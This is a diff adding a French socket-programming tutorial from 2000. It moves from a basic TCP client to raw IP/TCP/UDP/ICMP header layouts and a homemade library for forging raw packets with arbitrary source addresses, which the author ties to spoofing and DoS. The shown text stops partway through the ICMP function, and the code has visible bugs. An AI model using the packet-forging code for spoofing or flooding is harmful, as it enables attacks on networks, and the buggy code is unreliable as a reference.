@@ -1,0 +1,1850 @@
+/***************************************************************************
+                             Coder socket(avancé)...
+                              (Texte Version 1.1)
+                             -----------------------
+    begin                : 20 dec 2000
+    copyright            : (C) 2000 by Anti-Social
+    email                : lionel56@nether.net
+    site                 : www.nether.net/~lionel56/
+ ***************************************************************************/
+
+
+1- Coder un socket
+__________________
+
+a- Comment ouvrir une connection?
+==================================
+Pour coder un socket, les meilleurs outils pour vous aider sont:
+man, les includes, un bon livre...
+Le mieux est un petit exemple:
+
+/*   ************************Exemple1******************** */
+/* a1) Les includes */
+/* Anti-Social Ouvrire une connection TCP */
+#include <stdio.h>
+#include <unistd.h>
+#include <stdarg.h>
+#include <netinet/ip.h> 
+#include <netinet/in.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <string.h>
+/* a2) le code */
+
+
+void stacon(int lesock);
+int connect_tcp(struct in_addr addr,unsigned short port);
+int fdprintf(int dafd,char *fmt,...);
+
+
+int main(int argc,char **argv) {
+	int sockfd; 
+	struct in_addr ip;
+
+		printf("Anti-Social\n");
+		printf("Coder Socket(avanc�)\n");
+if(argc<3){
+		printf("usage:%s ip port\n",argv[0]);
+	exit(0);
+}
+
+		printf("Connection sur %s:%s\n" ,argv[1],argv[2]);
+
+if (!host_to_ip(argv[1],&ip)) 
+{                             
+		printf("Erreur de resolution hostname\n");
+	exit(0);
+}
+
+if ((sockfd=connect_tcp(ip,argv[2])) > 0) 
+{
+		printf("Port %s ouvert sur %s\n",argv[2],argv[1]);
+		fdprintf(sockfd,"Texte a envoier");
+	stacon(sockfd);
+}
+
+else{
+		printf("Port %s ferm� sur %s\n",argv[2],argv[1]);
+	exit(0);
+}
+}
+
+/* stabilise la connection  -><- */
+void stacon(int lesock) {
+	int n;
+	char recvbuf[1024];
+	fd_set rset;
+
+while (1)
+{
+  FD_ZERO(&rset);
+  FD_SET(lesock,&rset);
+  FD_SET(STDIN_FILENO,&rset);
+  select(lesock+1,&rset,NULL,NULL,NULL);
+  if (FD_ISSET(lesock,&rset))
+  {
+    n=read(lesock,recvbuf,1024);
+    if (n <= 0)
+
+    {
+      printf("Connection ferm�e\n");
+      exit(0);
+    }
+    recvbuf[n]=0;
+    printf("%s",recvbuf);      
+  }
+  if (FD_ISSET(STDIN_FILENO,&rset))
+  {
+    n=read(STDIN_FILENO,recvbuf,1024);
+    if (n>0)
+    {
+      recvbuf[n]=0;
+      write(lesock,recvbuf,n);
+    }
+  }
+}
+}
+
+/* ecrit dans une connection */
+
+int fdprintf(int dafd,char *fmt,...)
+{
+char mybuffer[4096];
+va_list va;
+
+va_start(va,fmt);
+vsnprintf(mybuffer,4096,fmt,va);
+write(dafd,mybuffer,strlen(mybuffer));
+va_end(va);
+return(1);
+}
+
+/* connextion tcp usage: host port */
+
+int connect_tcp(struct in_addr addr,unsigned short port)
+{
+struct sockaddr_in serv;
+int thesock,flags;
+
+thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+bzero(&serv,sizeof(serv));
+memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
+serv.sin_port=htons(port);
+serv.sin_family=AF_INET;
+if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
+  return(-1);
+else
+  return(thesock);
+}
+
+/* gethostname */
+int host_to_ip(char *hostname,struct in_addr *addr)
+{
+struct hostent *res;
+
+res=gethostbyname(hostname);
+if (res==NULL)
+  return(0);
+memcpy((char *)addr,res->h_addr,res->h_length);
+return(1);
+}
+/* **************************FIN*********************************** */
+
+b) Explication du code
+======================
+
+Il a 4 parties tr�s importantes dans ce code:
+/* **************La verification de l'host:******************** */
+strcut in_addr ip;
+host_to_ip(argv[1],&ip)
+int host_to_ip(char *hostname,struct in_addr *addr)
+{
+struct hostent *res;
+res=gethostbyname(hostname);
+if (res==NULL)
+return(0);
+memcpy((char *)addr,res->h_addr,res->h_length);
+return(1);
+}
+/* ************************************************************ */
+/* *******************La connection:*************************** */
+int sockfd;
+sockfd=connect_tcp(ip,argv[2])
+int connect_tcp(struct in_addr addr,unsigned short port)
+{
+struct sockaddr_in serv;
+int thesock,flags;
+thesock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
+bzero(&serv,sizeof(serv));
+memcpy(&serv.sin_addr,&addr,sizeof(struct in_addr));
+serv.sin_port=htons(port);
+serv.sin_family=AF_INET;
+if (connect(thesock,(struct sockaddr *)&serv,sizeof(serv)) < 0)
+  return(-1);
+else
+  return(thesock);
+}
+/* ************************************************************ */
+/* **************Ecrire dans la connection:******************** */
+fdprintf(sockfd,"TEXTE");
+int fdprintf(int dafd,char *fmt,...)
+{
+char mybuffer[4096];
+va_list va;
+
+va_start(va,fmt);
+vsnprintf(mybuffer,4096,fmt,va);
+write(dafd,mybuffer,strlen(mybuffer));
+va_end(va);
+return(1);
+}
+/* ************************************************************ */
+/* **************Stabiliser la connection*:******************** */
+stacon(sockfd;)
+void stacon(int lesock) {
+	int n;
+	char recvbuf[1024];
+	fd_set rset;
+
+while (1)
+{
+  FD_ZERO(&rset);
+  FD_SET(lesock,&rset);
+  FD_SET(STDIN_FILENO,&rset);
+  select(lesock+1,&rset,NULL,NULL,NULL);
+  if (FD_ISSET(lesock,&rset))
+  {
+    n=read(lesock,recvbuf,1024);
+    if (n <= 0)
+
+    {
+      printf("Connection ferm�e\n");
+      exit(0);
+    }
+    recvbuf[n]=0;
+    printf("%s",recvbuf);      
+  }
+  if (FD_ISSET(STDIN_FILENO,&rset))
+  {
+    n=read(STDIN_FILENO,recvbuf,1024);
+    if (n>0)
+    {
+      recvbuf[n]=0;
+      write(lesock,recvbuf,n);
+    }
+  }
+}
+}
+/* ************************************************************ */
+
+Deja avec c'est 4 fonction vous pouvez ecrire des clients...
+Pour ecrire un serveur , vous aurrez besion de ces base, plus les fonctions:
+bind(),listen(),fork()[pas oblig�],accept(),close() ou shutdown().
+Autres fonctions utiles:
+read(),write(),select()[pour en savoir +],sendto(),recv(),send(),getpeername(),
+recvfrom(),sendmsg(),recvmsg()
+Pour en savoir plus sur ces fonctions ci-dessus faites man ou more
+/usr/incude/sys/socket.h...
+
+Autre informations:
+Pour socket();
+AF_INET = determine socket pour UNIX
+SOCK_STREAM = determine le protocle TCP (UDP = SOCK_DGRAM)
+
+2- Socket(avanc�)
+_________________
+
+Maintenant que j'ai fini le petit rappel, on va pouvoir commencer les choses
+serieuses...
+Les socket comme on la vu sont prédéfinis, car en faite , il y a plein
+d'options que l'on peut definir , ce qui sert aux hackers pour spoofer ou pour
+faire des DoS ...
+Pour connaitre les paramètres avancés d'un packets tcp, udp , icmp ou autre
+plusieurs choix s'offrent a vous : un livre (c'est chere...), le rfc(mouais), les
+includes(ha quelle bonne idée!).
+Moi je vais faire grace au include mais faut savoir que de lire le rfc du
+protocole concerné c'est bien aussi...
+
+a) Les differentes parties
+==========================
+
+On distingue "plusieurs parties dans un packet":
+IP(toujours) puis la partie du protocol: TCP ou UDP ou ICMP ou autre...
+Les différents protocoles(/usr/include/netinet/in.h):
+
+/* Standard well-defined IP protocols.  */
+enum
+  {
+    IPPROTO_IP = 0,        /* Dummy protocol for TCP.  */
+    IPPROTO_HOPOPTS = 0,   /* IPv6 Hop-by-Hop options.  */
+    IPPROTO_ICMP = 1,      /* Internet Control Message Protocol.  */
+    IPPROTO_IGMP = 2,      /* Internet Group Management Protocol. */
+    IPPROTO_IPIP = 4,      /* IPIP tunnels (older KA9Q tunnels use 94).  */
+    IPPROTO_TCP = 6,       /* Transmission Control Protocol.  */
+    IPPROTO_EGP = 8,       /* Exterior Gateway Protocol.  */
+    IPPROTO_PUP = 12,      /* PUP protocol.  */
+    IPPROTO_UDP = 17,      /* User Datagram Protocol.  */
+    IPPROTO_IDP = 22,      /* XNS IDP protocol.  */
+    IPPROTO_TP = 29,       /* SO Transport Protocol Class 4.  */
+    IPPROTO_IPV6 = 41,     /* IPv6 header.  */
+    IPPROTO_ROUTING = 43,  /* IPv6 routing header.  */
+    IPPROTO_FRAGMENT = 44, /* IPv6 fragmentation header.  */
+    IPPROTO_RSVP = 46,     /* Reservation Protocol.  */
+    IPPROTO_GRE = 47,      /* General Routing Encapsulation.  */
+    IPPROTO_ESP = 50,      /* encapsulating security payload.  */
+    IPPROTO_AH = 51,       /* authentication header.  */
+    IPPROTO_ICMPV6 = 58,   /* ICMPv6.  */
+    IPPROTO_NONE = 59,     /* IPv6 no next header.  */
+    IPPROTO_DSTOPTS = 60,  /* IPv6 destination options.  */
+    IPPROTO_MTP = 92,      /* Multicast Transport Protocol.  */
+    IPPROTO_ENCAP = 98,    /* Encapsulation Header.  */
+    IPPROTO_PIM = 103,     /* Protocol Independent Multicast.  */
+    IPPROTO_COMP = 108,    /* Compression Header Protocol.  */
+    IPPROTO_RAW = 255,     /* Raw IP packets.  */
+    IPPROTO_MAX
+  };      
+Y en a bcps :o)
+
+/* ******************On va etudier la partie IP**************************** */
+(/usr/include/netinet/in.h&/usr/include/netinet/ip.h): 
+/* Internet address. */ 
+struct in_addr   {
+    uint32_t s_addr;
+  };
+                                                                                
+struct sockaddr_in
+  {
+    __SOCKADDR_COMMON (sin_);
+    uint16_t sin_port;                  /* Port number.  */
+    struct in_addr sin_addr;            /* Internet address.  */
+ 
+    /* Pad to size of `struct sockaddr'.  */
+    unsigned char sin_zero[sizeof (struct sockaddr) -
+                           __SOCKADDR_COMMON_SIZE -
+                           sizeof (uint16_t) -
+                           sizeof (struct in_addr)];
+  };                                     
+struct iphdr
+  {
+#if __BYTE_ORDER == __LITTLE_ENDIAN
+    unsigned int ihl:4;
+    unsigned int version:4;
+#elif __BYTE_ORDER == __BIG_ENDIAN
+    unsigned int version:4;
+    unsigned int ihl:4;
+#else
+# error "Please fix <bits/endian.h>"
+#endif
+    u_int8_t tos;
+    u_int16_t tot_len;
+    u_int16_t id;
+    u_int16_t frag_off;
+    u_int8_t ttl;
+    u_int8_t protocol;
+    u_int16_t check;
+    u_int32_t saddr;
+    u_int32_t daddr;
+    /*The options start here. */
+  };      
+struct ip
+  {
+#if __BYTE_ORDER == __LITTLE_ENDIAN
+    unsigned int ip_hl:4;               /* header length */
+    unsigned int ip_v:4;                /* version */
+#endif
+#if __BYTE_ORDER == __BIG_ENDIAN
+    unsigned int ip_v:4;                /* version */
+    unsigned int ip_hl:4;               /* header length */
+#endif
+    u_int8_t ip_tos;                    /* type of service */
+    u_short ip_len;                     /* total length */
+    u_short ip_id;                      /* identification */
+    u_short ip_off;                     /* fragment offset field */
+#define IP_RF 0x8000                    /* reserved fragment flag */
+#define IP_DF 0x4000                    /* dont fragment flag */
+#define IP_MF 0x2000                    /* more fragments flag */
+#define IP_OFFMASK 0x1fff               /* mask for fragmenting bits */
+    u_int8_t ip_ttl;                    /* time to live */
+    u_int8_t ip_p;                      /* protocol */
+    u_short ip_sum;                     /* checksum */
+    struct in_addr ip_src, ip_dst;      /* source and dest address */
+  };  
+
+#define IPVERSION       4               /* IP version number */
+#define IP_MAXPACKET    65535           /* maximum packet size */                                                                        
+/*
+ * Definitions for IP type of service (ip_tos)
+ */
+#define IPTOS_TOS_MASK          0x1E
+#define IPTOS_TOS(tos)          ((tos) & IPTOS_TOS_MASK)
+#define IPTOS_LOWDELAY          0x10
+#define IPTOS_THROUGHPUT        0x08
+#define IPTOS_RELIABILITY       0x04
+#define IPTOS_LOWCOST           0x02
+#define IPTOS_MINCOST           IPTOS_LOWCOST   
+
+/*
+ * Definitions for IP precedence (also in ip_tos) (hopefully unused)
+ */
+#define IPTOS_PREC_MASK                 0xe0
+#define IPTOS_PREC(tos)                ((tos) & IPTOS_PREC_MASK)
+#define IPTOS_PREC_NETCONTROL           0xe0
+#define IPTOS_PREC_INTERNETCONTROL      0xc0
+#define IPTOS_PREC_CRITIC_ECP           0xa0
+#define IPTOS_PREC_FLASHOVERRIDE        0x80
+#define IPTOS_PREC_FLASH                0x60
+#define IPTOS_PREC_IMMEDIATE            0x40
+#define IPTOS_PREC_PRIORITY             0x20
+#define IPTOS_PREC_ROUTINE              0x00        
+
+/*
+ * Internet implementation parameters.
+ */
+#define MAXTTL          255             /* maximum time to live (seconds) */
+#define IPDEFTTL        64              /* default ttl, from RFC 1340 */
+#define IPFRAGTTL       60              /* time to live for frags, slowhz */
+#define IPTTLDEC        1               /* subtracted when forwarding */
+ 
+#define IP_MSS          576             /* default maximum segment size */   
+/*************************************************************************/
+
+/* ***********************La partie TCP************************** */
+(/usr/include/netinet/tcp.h)
+struct tcphdr
+  {
+    u_int16_t source;
+    u_int16_t dest;
+    u_int32_t seq;
+    u_int32_t ack_seq;
+#if __BYTE_ORDER == __LITTLE_ENDIAN
+    u_int16_t res1:4;
+    u_int16_t doff:4;
+    u_int16_t fin:1;
+    u_int16_t syn:1;
+    u_int16_t rst:1;
+    u_int16_t psh:1;
+    u_int16_t ack:1;
+    u_int16_t urg:1;
+    u_int16_t res2:2;
+#elif __BYTE_ORDER == __BIG_ENDIAN
+    u_int16_t doff:4;
+    u_int16_t res1:4;
+    u_int16_t res2:2;
+    u_int16_t urg:1;
+    u_int16_t ack:1;
+    u_int16_t psh:1;
+    u_int16_t rst:1;
+    u_int16_t syn:1;
+    u_int16_t fin:1;
+#else
+#error  "Adjust your <bits/endian.h> defines"
+#endif
+    u_int16_t window;
+    u_int16_t check;
+    u_int16_t urg_ptr;
+}; 
+
+enum
+{
+  TCP_ESTABLISHED = 1,
+  TCP_SYN_SENT,
+  TCP_SYN_RECV,
+  TCP_FIN_WAIT1,
+  TCP_FIN_WAIT2,
+  TCP_TIME_WAIT,
+  TCP_CLOSE,
+  TCP_CLOSE_WAIT,
+  TCP_LAST_ACK,
+  TCP_LISTEN,
+  TCP_CLOSING   /* now a valid state */
+};    
+/*
+ * Default maximum segment size for TCP.
+ * With an IP MSS of 576, this is 536,
+ * but 512 is probably more convenient.
+ * This should be defined as MIN(512, IP_MSS - sizeof (struct tcpiphdr)).
+ */
+#define TCP_MSS 512
+ 
+#define TCP_MAXWIN      65535   /* largest value for (unscaled) window */
+ 
+#define TCP_MAX_WINSHIFT        14      /* maximum window shift */
+                                                                                
+/******************************************************************/
+/* ***********************La partie UDP************************** */
+struct udphdr {
+  u_int16_t     source;
+  u_int16_t     dest;
+  u_int16_t     len;
+  u_int16_t     check;
+};          
+#define SOL_UDP            17      /* sockopt level for UDP */  
+/******************************************************************/
+/* ***********************La partie ICMP************************** */
+struct icmphdr
+{
+  u_int8_t type;                /* message type */
+  u_int8_t code;                /* type sub-code */
+  u_int16_t checksum;
+  union
+  {
+    struct
+    {
+      u_int16_t id;
+      u_int16_t sequence;
+    } echo;                     /* echo datagram */
+    u_int32_t   gateway;        /* gateway address */
+    struct
+    {
+      u_int16_t __unused;
+      u_int16_t mtu;
+    } frag;                     /* path mtu discovery */
+  } un;
+};
+
+#define ICMP_ECHOREPLY          0       /* Echo Reply                   */
+#define ICMP_DEST_UNREACH       3       /* Destination Unreachable      */
+#define ICMP_SOURCE_QUENCH      4       /* Source Quench                */
+#define ICMP_REDIRECT           5       /* Redirect (change route)      */
+#define ICMP_ECHO               8       /* Echo Request                 */
+#define ICMP_TIME_EXCEEDED      11      /* Time Exceeded                */
+#define ICMP_PARAMETERPROB      12      /* Parameter Problem            */
+#define ICMP_TIMESTAMP          13      /* Timestamp Request            */
+#define ICMP_TIMESTAMPREPLY     14      /* Timestamp Reply              */
+#define ICMP_INFO_REQUEST       15      /* Information Request          */
+#define ICMP_INFO_REPLY         16      /* Information Reply            */
+#define ICMP_ADDRESS            17      /* Address Mask Request         */
+#define ICMP_ADDRESSREPLY       18      /* Address Mask Reply           */
+#define NR_ICMP_TYPES           18
+
+
+/* Codes for UNREACH. */
+#define ICMP_NET_UNREACH        0       /* Network Unreachable          */
+#define ICMP_HOST_UNREACH       1       /* Host Unreachable             */
+#define ICMP_PROT_UNREACH       2       /* Protocol Unreachable         */
+#define ICMP_PORT_UNREACH       3       /* Port Unreachable             */
+#define ICMP_FRAG_NEEDED        4       /* Fragmentation Needed/DF set  */
+#define ICMP_SR_FAILED          5       /* Source Route failed          */
+#define ICMP_NET_UNKNOWN        6
+#define ICMP_HOST_UNKNOWN       7
+#define ICMP_HOST_ISOLATED      8
+#define ICMP_NET_ANO            9
+#define ICMP_HOST_ANO           10
+#define ICMP_NET_UNR_TOS        11
+#define ICMP_HOST_UNR_TOS       12
+#define ICMP_PKT_FILTERED       13      /* Packet filtered */
+#define ICMP_PREC_VIOLATION     14      /* Precedence violation */
+#define ICMP_PREC_CUTOFF        15      /* Precedence cut off */
+#define NR_ICMP_UNREACH         15      /* instead of hardcoding immediate value
+ */
+
+/* Codes for REDIRECT. */
+#define ICMP_REDIR_HOST         1       /* Redirect Host                */
+#define ICMP_REDIR_NETTOS       2       /* Redirect Net for TOS         */
+#define ICMP_REDIR_HOSTTOS      3       /* Redirect Host for TOS        */
+ 
+/* Codes for TIME_EXCEEDED. */
+#define ICMP_EXC_TTL            0       /* TTL count exceeded           */
+#define ICMP_EXC_FRAGTIME       1       /* Fragment Reass time exceeded */ 
+
+   /* Definition of type and code fields. */
+/* defined above: ICMP_ECHOREPLY, ICMP_REDIRECT, ICMP_ECHO */
+#define ICMP_UNREACH            3               /* dest unreachable, codes: */
+#define ICMP_SOURCEQUENCH       4               /* packet lost, slow down */
+#define ICMP_ROUTERADVERT       9               /* router advertisement */
+#define ICMP_ROUTERSOLICIT      10              /* router solicitation */
+#define ICMP_TIMXCEED           11              /* time exceeded, code: */
+#define ICMP_PARAMPROB          12              /* ip header bad */
+#define ICMP_TSTAMP             13              /* timestamp request */
+#define ICMP_TSTAMPREPLY        14              /* timestamp reply */
+#define ICMP_IREQ               15              /* information request */
+#define ICMP_IREQREPLY          16              /* information reply */
+#define ICMP_MASKREQ            17              /* address mask request */
+#define ICMP_MASKREPLY          18              /* address mask reply */
+
+#define ICMP_MAXTYPE            18
+
+/* UNREACH codes */
+#define ICMP_UNREACH_NET                0       /* bad net */
+#define ICMP_UNREACH_HOST               1       /* bad host */
+#define ICMP_UNREACH_PROTOCOL           2       /* bad protocol */
+#define ICMP_UNREACH_PORT               3       /* bad port */
+#define ICMP_UNREACH_NEEDFRAG           4       /* IP_DF caused drop */
+#define ICMP_UNREACH_SRCFAIL            5       /* src route failed */
+#define ICMP_UNREACH_NET_UNKNOWN        6       /* unknown net */
+#define ICMP_UNREACH_HOST_UNKNOWN       7       /* unknown host */
+#define ICMP_UNREACH_ISOLATED           8       /* src host isolated */
+#define ICMP_UNREACH_NET_PROHIB         9       /* net denied */
+#define ICMP_UNREACH_HOST_PROHIB        10      /* host denied */
+#define ICMP_UNREACH_TOSNET             11      /* bad tos for net */
+#define ICMP_UNREACH_TOSHOST            12      /* bad tos for host */
+#define ICMP_UNREACH_FILTER_PROHIB      13      /* admin prohib */
+#define ICMP_UNREACH_HOST_PRECEDENCE    14      /* host prec vio. */
+#define ICMP_UNREACH_PRECEDENCE_CUTOFF  15      /* prec cutoff */
+
+/* REDIRECT codes */
+#define ICMP_REDIRECT_NET       0               /* for network */
+#define ICMP_REDIRECT_HOST      1               /* for host */
+#define ICMP_REDIRECT_TOSNET    2               /* for tos and net */
+#define ICMP_REDIRECT_TOSHOST   3               /* for tos and host */
+ 
+/* TIMEXCEED codes */
+#define ICMP_TIMXCEED_INTRANS   0               /* ttl==0 in transit */
+#define ICMP_TIMXCEED_REASS     1               /* ttl==0 in reass */
+ 
+/* PARAMPROB code */
+#define ICMP_PARAMPROB_OPTABSENT 1              /* req. opt. absent */  
+/*******************************************************************/
+
+Avec toutes ces bases on peut écrire ce que l'on veut!
+
+Quand on utilise ces options avancées ce n'est pas pour faire une connection
+donc oublier la sous-fonction stacon(); 
+Ceci ne sert qu'a envoier des packets mais pas a établir une connection( enfin
+dans la plus part des cas ...).
+
+Il ne vous reste plus qu'a(exemple pour le udp):
+struct packet{
+struct iphdr ip;
+struct udphdr udp;
+};
+main(){
+point sur le g�n� de packets
+} 
+packet()
+{
+int lesocket;
+struct sockaddr_in sock;
+struct packet   packet;
+gethostbyname( les 2 ip [src & dst]);
+lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+packet.ip.***** = ****;
+packet.udp.***** = ****;
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = *******; 
+sock.sin_port = ******;
+sendto(lesock, &packet, taille-du-packet, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr));
+close(lesock);
+}
+
+3- Ma libsocket 
+_______________
+
+/****************************************************************************/
+/*              LIBSOCKET.C lib pour TCP/UDP/ICMP packet                    */
+/*   $cc -c libsocket.c;ar crv libsocket.a libsocket.o;ranlib libsocket.a   */
+/*$cp libsocket.a /usr/lib/ ? => cc -c prog.c;cc -o prog prog.o -L. -lsocket*/ 
+/****************************************************************************/
+/* Anti-Social => lionel56@nether.net */
+/* Libsocket TCP/UDP/ICMP */
+/* Thx: 
+ * kalou & aligator & v!l XSFX & HegemOon & Spoty & et les autres...
+ * #0z0n3 & #codefr & #bsdfr & #root ;) 
+ */
+#include <stdio.h>
+#include <unistd.h>
+#include <stdarg.h>
+#include <netinet/ip.h> 
+#include <netinet/tcp.h> 
+#include <netinet/udp.h> 
+#include <netinet/ip_icmp.h> 
+#include <netinet/in.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <string.h>
+
+#define ICMPHDRSIZE sizeof(struct icmphdr)
+#define TCPHDRSIZE sizeof(struct tcphdr)
+#define UDPHDRSIZE sizeof(struct udphdr)
+#define IPHDRSIZE sizeof(struct iphdr)
+#define PSEUDOHDRSIZE sizeof(struct pseudohdr)
+
+struct pseudohdr {
+	u_long saddr;
+	u_long daddr;
+	u_char zero;
+	u_char protocol;
+	u_short length;
+};
+
+struct tcp_packet
+{
+struct iphdr    ip;
+struct tcphdr   tcp;
+struct pseudohdr    pseudo;
+char buffer[4096];
+};
+
+struct udp_packet
+{
+struct iphdr    ip;
+struct udphdr   udp;
+char buffer[4096];
+};
+
+struct icmp_packet
+{
+struct iphdr    ip;
+struct icmphdr   icmp;
+char buffer[4096];
+};
+
+/*   DEFINE OPTIONS TCP       */
+/*   DEFINE OPTIONS UDP       */
+/*   DEFINE OPTIONS ICMP      */
+
+/* ********************************TCP********************************** */
+/* packet_tcp( source_ip, destination_ip, source_port, destination_port, */
+/*            ip->ID, frag_off, ttl, DATA, FLAG_SYN, FLAG_FIN, FLAG_ACK, */
+/*            FLAG_RESET, FLAG_PUSH, FLAG_URGENT, 0, 0, SEQUENCE, ACK,   */
+/*            URGENT_PTR, tcp->DOFF, WIN);                               */
+/* ********************************************************************* */
+int
+packet_tcp(srci,dsti,srcp,dstp,rid,frago,rttl,data,syn,fin,ack,rst,psh,urg,res1,res2,seqn,ackn,urgp,doff,winn)
+char *srci, *dsti, *data;
+int srcp, dstp; 
+int rid,frago,rttl;
+char *syn,*fin,*ack,*rst,*psh,*urg;
+int res1,res2;
+int seqn, ackn, urgp, doff, winn; 
+{
+struct sockaddr_in sock;
+struct tcp_packet ptcp;
+struct hostent *res; 
+
+int lesock;
+int szbuff; /* taille du buffer */
+int szpkt; /* taille du packet */
+
+/* configuration packet */
+u_long rsrc_ip; /* src ip */
+u_long rdst_ip; /* dst ip */                 
+int src_prt=srcp; /* src port */
+int dst_prt=dstp; /* dst port */
+char *src_ip=srci; /* arriv�e src ip */          
+char *dst_ip=dsti; /* arriv�e dst ip */
+
+/* gethostbyname */
+res = gethostbyname(src_ip);
+memcpy(&rsrc_ip, res->h_addr, res->h_length);
+memset(res, 0, sizeof(struct hostent));  
+res = gethostbyname(dst_ip);
+memcpy(&rdst_ip, res->h_addr, res->h_length);
+/* fin */
+
+/* Ouvre socket */
+if(!(lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)))return(-1);   
+
+/* entre DATA  + entre taille du packet */
+if(strlen(data)<4096){
+strcpy(ptcp.buffer,data);
+}
+else{
+printf("Buffer OverfloW ?!! :o)\n");
+exit(0);
+}
+szbuff=strlen(ptcp.buffer);
+szpkt=sizeof(struct tcphdr)+sizeof(struct iphdr)+szbuff;
+
+/* fabrique le packet */
+
+memset(&ptcp, 0, szpkt); 
+
+ptcp.pseudo.saddr = rsrc_ip;
+ptcp.pseudo.daddr = rdst_ip; 
+ptcp.pseudo.zero = 0;
+ptcp.pseudo.protocol=6;
+ptcp.pseudo.length = htons( 8 + szbuff );
+
+ptcp.ip.version = 4; /* IPV4 */
+ptcp.ip.ihl = 5; 
+ptcp.ip.tot_len = htons(szpkt); /* Taille du packet */
+ptcp.ip.id = htons(rid); /* ID */
+ptcp.ip.frag_off = htons(frago); /* frag off */ 
+ptcp.ip.ttl = rttl; /* TTL */
+ptcp.ip.protocol = 6; /* Protocol 6 = TCP */
+ptcp.ip.saddr = rsrc_ip; /* source ip */
+ptcp.ip.daddr = rdst_ip; /* dst ip */
+ptcp.ip.check = in_cksum((char *)&ptcp,IPHDRSIZE);
+
+ptcp.tcp.source = htons(src_prt); /* port source */    
+ptcp.tcp.dest = htons(dst_prt); /* port dest */
+if(seqn>0)ptcp.tcp.seq = seqn;
+if(ackn>0)ptcp.tcp.ack_seq = ackn;
+if(res1>0)ptcp.tcp.res1 = res1;
+if(doff>0)ptcp.tcp.doff = doff; /* 5? */
+if(strlen(fin)>0)ptcp.tcp.fin = 1;
+if(strlen(syn)>0)ptcp.tcp.syn = 1;
+if(strlen(rst)>0)ptcp.tcp.rst = 1;
+if(strlen(psh)>0)ptcp.tcp.psh = 1;
+if(strlen(ack)>0)ptcp.tcp.ack = 1;
+if(strlen(urg)>0)ptcp.tcp.urg = 1;
+if(res2>0)ptcp.tcp.res2 = res2;
+if(winn>0)ptcp.tcp.window = winn; /* 512 ? */
+if(urgp>0)ptcp.tcp.urg_ptr= urgp;
+// ptcp.tcp.len = htons(8 + szbuff); /* taille buffer udp */
+ptcp.tcp.check = in_cksum((char *)&ptcp,IPHDRSIZE + TCPHDRSIZE 
++ szbuff + PSEUDOHDRSIZE);
+
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = ptcp.ip.daddr; /* ip dest */ 
+sock.sin_port = ptcp.tcp.dest;
+
+/* Envoie le packet!! */
+sendto(lesock, &ptcp, szpkt, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr));
+
+/* Fermeture du socket */
+close(lesock);
+}
+/* **************************UDP**************************************** */
+/* packet_udp( source_ip, destination_ip, source_port, destination_port, */
+/*            ip->ID, frag_off, ttl, DATA);                              */
+/* ********************************************************************* */
+int packet_udp(srci,dsti,srcp,dstp,rid,frago,rttl,data)
+char *srci,*dsti,*data; 
+int srcp,dstp,rid,frago,rttl;
+{ 
+struct sockaddr_in sock;
+struct udp_packet   pudp;
+struct hostent *res; 
+
+int lesock;
+int szbuff; /* taille du buffer */
+int szpkt; /* taille du packet */
+
+/* configuration packet */
+u_long rsrc_ip; /* src ip */
+u_long rdst_ip; /* dst ip */                 
+int src_prt=srcp; /* src port */
+int dst_prt=dstp; /* dst port */
+char *src_ip=srci; /* arriv�e src ip */          
+char *dst_ip=dsti; /* arriv�e dst ip */
+
+/* gethostbyname */
+res = gethostbyname(src_ip);
+memcpy(&rsrc_ip, res->h_addr, res->h_length);
+memset(res, 0, sizeof(struct hostent));  
+res = gethostbyname(dst_ip);
+memcpy(&rdst_ip, res->h_addr, res->h_length);
+/* fin */
+
+/* Ouvre socket */
+if(!(lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)))return(-1);   
+
+/* entre DATA  + entre taille du packet */
+if(strlen(data)<4096){
+strcpy(pudp.buffer,data);
+}
+else{
+printf("Buffer OverfloW ?!! :o)\n");
+exit(0);
+}
+szbuff=strlen(pudp.buffer);
+szpkt=sizeof(struct udphdr)+sizeof(struct iphdr)+szbuff;
+
+/* fabrique le packet */
+
+memset(&pudp, 0, szpkt); 
+
+pudp.ip.version = 4; /* IPV4 */
+pudp.ip.ihl = 5; 
+pudp.ip.tot_len = htons(szpkt); /* Taille du packet */
+pudp.ip.id = htons(rid); /* ID */
+pudp.ip.frag_off = htons(frago); /* frag off */ 
+pudp.ip.ttl = rttl; /* TTL */
+pudp.ip.protocol = 17; /* Protocol 17 = UDP*/
+pudp.ip.saddr = rsrc_ip; /* source ip */
+pudp.ip.daddr = rdst_ip; /* dst ip */
+pudp.ip.check = in_cksum((char *)&pudp,IPHDRSIZE);
+
+pudp.udp.source = htons(src_prt); /* port source */    
+pudp.udp.dest = htons(dst_prt); /* port dest */
+pudp.udp.len = htons(8 + szbuff); /* taille buffer udp */
+pudp.udp.check = in_cksum((char *)&pudp,IPHDRSIZE + UDPHDRSIZE 
++ szbuff);
+
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = pudp.ip.daddr; /*  ip dest */ 
+sock.sin_port = pudp.udp.dest; 
+
+/* Envoie le packet!! */
+sendto(lesock, &pudp, szpkt, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr));
+
+/* Fermeture du socket */
+close(lesock);
+}
+
+/* ****************************ICMP************************************** */
+/* packet_icmp( source_ip, destination_ip, source_port, destination_port, */
+/*             ip->ID, frag_off, ttl, DATA, ICMP_CODE, ICMP_TYPE, GATEWAY */
+/*             , ICMP_SEQUENCE, ICMP_ID, ICMP_MTU);                       */
+/* ********************************************************************** */  
+int
+packet_icmp(srci,dsti,rid,frago,rttl,data,code,type,gate,seqn,idn,mtun)
+char *srci,*dsti,*data;
+int type,code,gate,seqn,idn,mtun,rid,frago,rttl;
+{  
+struct sockaddr_in sock; 
+struct icmp_packet   picmp;
+struct hostent *res; 
+
+int lesock;
+int szbuff; /* taille du buffer */
+int szpkt; /* taille du packet */
+
+/* configuration packet */
+u_long rsrc_ip; /* src ip */
